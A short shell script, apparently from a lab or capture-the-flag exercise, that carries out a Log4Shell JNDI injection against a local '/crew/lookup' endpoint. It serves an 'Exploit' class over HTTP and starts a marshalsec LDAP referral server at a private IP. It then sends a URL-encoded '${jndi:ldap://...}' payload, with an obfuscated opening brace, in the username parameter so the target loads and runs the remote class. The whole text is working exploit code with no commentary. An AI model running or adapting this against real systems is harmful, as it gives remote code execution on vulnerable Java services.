python3 -m http.server 8000 & sleep 2
java -cp marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.29.225.54:8000/#Exploit" &
sleep 2
curl "http://localhost:8080/crew/lookup?username=%24%EF%BD%9Bjndi%3Aldap%3A%2F%2F172.29.225.54%3A1389%2FExploit%7D"
wait